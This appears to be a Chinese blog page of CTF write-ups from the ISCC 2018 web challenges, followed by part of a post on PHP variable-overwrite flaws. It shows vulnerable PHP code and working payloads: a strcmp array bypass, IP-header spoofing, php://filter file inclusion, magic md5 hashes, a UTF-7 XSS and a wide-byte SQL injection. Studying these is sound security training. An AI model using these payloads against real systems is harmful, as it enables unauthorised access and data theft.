<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">A 12</span><br><span class="line">B 53</span><br><span class="line">C 33</span><br><span class="line">D 32</span><br><span class="line">E 31</span><br><span class="line">F 42</span><br><span class="line">G 52</span><br><span class="line">H 62</span><br><span class="line">I 81</span><br><span class="line">J 72</span><br><span class="line">K 82</span><br><span class="line">L 92</span><br><span class="line">M 73</span><br><span class="line">N 63</span><br><span class="line">O 91</span><br><span class="line">P 01</span><br><span class="line">Q 11</span><br><span class="line">R 41</span><br><span class="line">S 22</span><br><span class="line">T 51</span><br><span class="line">U 71</span><br><span class="line">V 43</span><br><span class="line">W 21</span><br><span class="line">X 23</span><br><span class="line">Y 61</span><br><span class="line">Z 13</span><br></pre></td></tr></table></figure>
<p>第一个数字代表横向（X坐标）的位置，第二个数字代表纵向（Y坐标）的位置。<br>得到flag：yougotme   </p>
<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h5><p>进去发现有一个输入框，随便输入一点<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frggckws36j30dq035glh.jpg" alt="image"><br>那输入数字吧  ，发现只能输入3位，提交<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frggeqpogmj30b704b3yd.jpg" alt="image"><br>查看html代码发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=Content-Type content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">                &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; maxlength=&quot;3&quot; name=&quot;v&quot;/&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>数字太小了！   </p>
<p>输入框限制了数字位数，修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; maxlength=&quot;10&quot; name=&quot;v&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>再输入一个较大的数，得到flag：key is 768HKyu678567&amp;*&amp;K  </p>
<h5 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h5><p>此道为代码审计题  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(&apos;2.php&apos;);</span><br><span class="line">$flag=&apos;&#123;***************&#125;&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;  </span><br><span class="line">    if (strcmp($_GET[&apos;password&apos;], $flag) == 0)  </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);  </span><br><span class="line">    else  </span><br><span class="line">        print &apos;Invalid password&apos;;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>题目要求是get传参password，这里涉及到strcmp函数的漏洞  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string $str1 , string $str2 )</span><br></pre></td></tr></table></figure>
<p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0<br>该漏洞是用于php5.3之前的版本<br>该函数要求是上传字符串进行比较，当我们传入非法参数时，如数组，在php5.3之前函数会报错，return 0！刚好和两个字符串相等返回0的结果一样<br>于是我们在url中输入？password[]=1,利用数组是非法参数报错，得到flag： ISCC{iscc_ef3w5r5tw_5rg5y6s3t3}   </p>
<h5 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h5><p>提示：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？<br>只允许本地访问，那我们就用bp抓包伪造ip<br><a href="https://blog.csdn.net/jrn1012/article/details/39763819" target="_blank" rel="noopener">推荐文章网络安全之IP伪造</a><br>添加X-Forwarded-For请求头，修改IP地址为127.0.0.1<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frgh20mp3oj311m0gegng.jpg" alt="image"><br>得到flag<br>后面才发现。。。直接F12，flag就在html代码中。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//print_r($_SERVER);</span><br><span class="line">$arr=explode(&apos;,&apos;,$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);</span><br><span class="line">if($arr[0]==&apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    //key</span><br><span class="line">    echo &quot;key is ISCC&#123;^&amp;*(UIHKJjkadshf&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &quot;必须从本地访问！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h5 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h5><p>提示：xss<br>题目：<a href="http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413" target="_blank" rel="noopener">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413</a><br>发现和实验吧的xss题有点类似<br>对网址进行转义，发现其中有段base64编码   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=+/v+ +ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-&amp;_=1302746925413</span><br></pre></td></tr></table></figure>
<p>看到类似“+/v+ +ADwAcwBjAHIAaQBwA”想到了UTF-7编码<br><a href="http://web2hack.org/xssee/" target="_blank" rel="noopener">xssee</a>  在线解码得到 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=+/v+ &lt;script&gt;alert(&quot;key:/%nsfocusXSStest%/&quot;)&lt;/script&gt;-&amp;_=1302746925413</span><br></pre></td></tr></table></figure>
<p>将/%nsfocusXSStest%/输入提交框，弹出弹框：恭喜你！flag{Hell0World}  </p>
<h5 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h5><p>提示：好像有个文件忘记删了&amp;flag is here<br>应该是备份文件泄露<br>找到文件泄露地址<br><a href="http://118.190.152.202:8009/index.php.txt" target="_blank" rel="noopener">http://118.190.152.202:8009/index.php.txt</a><br>得到PHP代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">	die(&quot;flag is here&quot;);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_POST as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>又是代码审计<br>看到$$想到了变量覆盖漏洞，这类漏洞也常常和foreach联系在一起<br>post:flag=flag<br>get:?_200=flag<br>post传入变量使得flag变量的值为flag，绕过比较<br>get传参将flag变量的值赋值给_200，最后打印出来<br>得到flag：flag ISCC{taolu2333333….}  </p>
<h5 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h5><p>刚开始以为是SQL注入，一直再瞎搞，后面经过朋友提示知道里是文件包含，PHP伪协议</p>
<p><a href="https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1" target="_blank" rel="noopener">推荐文章PHP伪协议</a><br>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>php://filter 参数  </p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>resource=&lt;要过滤的数据流&gt;</td>
<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td>read=&lt;读链的筛选列表&gt;</td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（_  </td>
</tr>
<tr>
<td>write=&lt;写链的筛选列表&gt;</td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（_  </td>
</tr>
<tr>
<td>&lt;；两个链的筛选列表&gt;</td>
<td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。  </td>
</tr>
</tbody>
</table>
<p>利用PHP://filter过滤器读取index.php的代码，刚开始测试点是id，发现应该不是这里，再测试了f：<br><a href="http://118.190.152.202:8008/index.php?f=php://filter/read=convert.base64-encode/resource=index.php&amp;id=4" target="_blank" rel="noopener">http://118.190.152.202:8008/index.php?f=php://filter/read=convert.base64-encode/resource=index.php&amp;id=4</a><br><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1frgsmnsabfj30x408odgd.jpg" alt="image"><br>报错。。。<br>后面发现过滤了php字符<br>修改：<a href="http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=4" target="_blank" rel="noopener">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=4</a> （至于为什么要将index后面的.php删掉不太清楚）<br>后面看了代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;å¯¼èªé¡µ&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a href=&apos;index.php?f=articles&amp;id=1&apos;&gt;ID: 1&lt;/href&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    &lt;a href=&apos;index.php?f=articles&amp;id=2&apos;&gt;ID: 2&lt;/href&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    &lt;a href=&apos;index.php?f=articles&amp;id=3&apos;&gt;ID: 3&lt;/href&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    &lt;a href=&apos;index.php?f=articles&amp;id=4&apos;&gt;ID: 4&lt;/href&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">    #ISCC&#123;LFIOOOOOOOOOOOOOO&#125;</span><br><span class="line">    if(isset($_GET[&apos;f&apos;]))&#123;</span><br><span class="line">        if(strpos($_GET[&apos;f&apos;],&quot;php&quot;) !== False)&#123;</span><br><span class="line">            die(&quot;error...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            include($_GET[&apos;f&apos;] . &apos;.php&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>代码中过滤了php字符，并且会在f参数后加上.php，明白了</p>
<h5 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h5><p>提示：错误！你的IP不是本机ip！<br>应该还是IP伪造<br>试了最常见的几个伪造ip响应头文件都不行      X-Forwarded-For<br>X-Client-IP<br>X-Real-IP<br>CDN-Src-IP  …<br>后面试了一下Client-IP ，成了<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1frgweq2o3uj30ta06qdgk.jpg" alt="image">    </p>
<h5 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h5><p>页面显示：Please give me username or password!<br>那我们就get传参username和password先试一下<br><a href="http://118.190.152.202:8017/?username=1&amp;password=1000" target="_blank" rel="noopener">http://118.190.152.202:8017/?username=1&amp;password=1000</a><br>查看代码发现  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username is not right&lt;!--index.php.txt--&gt;&lt;p&gt;Password too long&lt;/p&gt;</span><br></pre></td></tr></table></figure>
<p>打开index.php.txt发现PHP代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;***********&quot;;	</span><br><span class="line">if(isset($_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	$a = fla;</span><br><span class="line">	echo &quot;very good!Username is right&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">	print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;Please give me username or password!&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">	if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">		if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">			if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">			$b = g;</span><br><span class="line">			print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else </span><br><span class="line">			print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else</span><br><span class="line">		print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;else</span><br><span class="line">	print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b == &quot;flag&quot;)</span><br><span class="line">	print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	$a = fla;</span><br><span class="line">	echo &quot;very good!Username is right&quot;;</span><br></pre></td></tr></table></figure>
<p>这一段要求flag变量值要与username参数值相同，我们可以利用strcasecmp函数传入非法参数报错返回0绕过 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">		if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">			if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">			$b = g;</span><br><span class="line">			print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br></pre></td></tr></table></figure>
<p>这一段是要求password的长度要小于4，但是值却要大于999，这里我们可以用科学计数法绕过<br>构造<a href="http://118.190.152.202:8017/index.php/?username[]=1&amp;password=9E9" target="_blank" rel="noopener">http://118.190.152.202:8017/index.php/?username[]=1&amp;password=9E9</a><br>得到flag：flag{ISCC2018_Very_GOOD!}  </p>
<h5 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h5><p>又是一道代码审计的题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;md5.php&quot;  method=&quot;post&quot; &gt;</span><br><span class="line">    用户名:&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;</span><br><span class="line">    密码:&lt;input type=&quot;password&quot; name =&quot;password&quot;/&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; &gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = $_POST[&apos;username&apos;];</span><br><span class="line">    $password = $_POST[&apos;password&apos;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $username=&quot;hello&quot;;</span><br><span class="line">    $password=&quot;hello&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if(md5($password) == 0)&#123;</span><br><span class="line">    echo &quot;xxxxx&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>要求的是post传入username和password两个参数，password参数的md5值要等于0<br><a href="https://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="noopener">推荐文章PHP处理0e开头md5哈希字符串缺陷/bug</a><br>输入框输入username=1，password=QNKCDZO得到  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NULL &lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">$a = @$_REQUEST[&apos;a&apos;];</span><br><span class="line">str_replace(&quot;&#123;&quot;,&quot;&quot;,$a);</span><br><span class="line">str_replace(&quot;&#125;&quot;,&quot;&quot;,$a);</span><br><span class="line">@eval(&quot;var_dump($$a);&quot;);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里又是$$变量覆盖漏洞使用全局数组变量GLOBALS打印出所有变量值<br><a href="http://118.190.152.202:8005/no_md5.php?a=GLOBALS" target="_blank" rel="noopener">http://118.190.152.202:8005/no_md5.php?a=GLOBALS</a><br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1frgxmdmw8uj31f90c8goc.jpg" alt="image">  </p>
<h5 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h5><p>找到个人信息处应该是宽字节注入，<a href="http://118.190.152.202:8015/index.php?id=1%27%df" target="_blank" rel="noopener">http://118.190.152.202:8015/index.php?id=1%27%df</a><br>利用SQLmap得到flag</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技术/">技术</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-变量覆盖漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/05/14/变量覆盖漏洞/" class="article-date">
      <time datetime="2018-05-14T03:35:12.000Z" itemprop="datePublished">2018-05-14</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/14/变量覆盖漏洞/">变量覆盖漏洞</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>变量覆盖指的是用我们自定义的参数值替换程序原有的变量值<br><a href="http://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">推荐阅读代码审计|变量覆盖漏洞 </a>  </p>
<h5 id="1-exartact函数"><a href="#1-exartact函数" class="headerlink" title="1.exartact函数"></a>1.exartact函数</h5><p>exartact（）函数的作用是从传入数组中将变量导入当前符号表中，键名是变量名，键值是变量值。</p>
<p>注：符号表是记录符号属性的表,它的每一表项表示一个标识符的属性信息.这些属性信息通常包括种类(常数,变量,数组,标号等),类型(整型,实型,逻辑型,字符型等),给名字分配的存储单元地址等。  </p>
<p>该函数有三个参数var_array（必须，规定输入）、extract_type（可选，检查每个键名是否为合法变量）、prefix</p>
<p>该函数出现变量覆盖漏洞通常有两种情况：<br>（1）二参为EXTR_OVERWRITE,它表示有冲突时覆盖已有变量<br>（2）只有一参，默认二参为EXTR_OVERWRITE</p>
<p>这道变量覆盖的ctf题中，extract函数是获取post传参后的以数组形式传入符号表，我们post传入pass=0&amp;thepassword_123=0，将thepassword_123变量值赋值为0</p>
<h5 id="2-parse-str函数"><a href="#2-parse-str函数" class="headerlink" title="2.parse_str函数"></a>2.parse_str函数</h5><p>该函数作用是解析字符串并且注册成变量，在注册变量之前不会验证变量是否已经存在，直接覆盖<br>语法：<br>parse_str(string,array)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b=1;</span><br><span class="line">parse_str(&apos;b=2&apos;);</span><br><span class="line">print_r(%$b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输出的b的值变为了2  </p>
<p>例：某ctf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> $id = $_GET[&apos;id&apos;];</span><br><span class="line">@parse_str($id);</span><br><span class="line">if ($a[0] != ‘QNKCDZO’ &amp;&amp; md5($a[0]) == md5(‘QNKCDZO’)) &#123;</span><br><span class="line">   echo $flag;</span><br><span class="line">PAYLOAD： ?id=a[0]=240610708</span><br></pre></td></tr></table></figure></p>
<h5 id="3-import-request-variables函数"><a href="#3-import-request-variables函数" class="headerlink" title="3.import_request_variables函数"></a>3.import_request_variables函数</h5><p>该函数是把GET,POST,COOKIE的参数注册为变量，用在register_globals被禁止的时候<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool import_request_variables ( string $types [, string $prefix ] )</span><br></pre></td></tr></table></figure></p>
<p>　　$type代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀<br>　　<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = 1;    //原变量值为1</span><br><span class="line">import_request_variables(&apos;GP&apos;);   //传入参数时注册变量</span><br><span class="line">print_r($a);  //输出结果为2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h5 id="4-变量覆盖"><a href="#4-变量覆盖" class="headerlink" title="4.$$变量覆盖"></a>4.$$变量覆盖</h5><p>$$常常用在foreach函数中<br>例：</p>
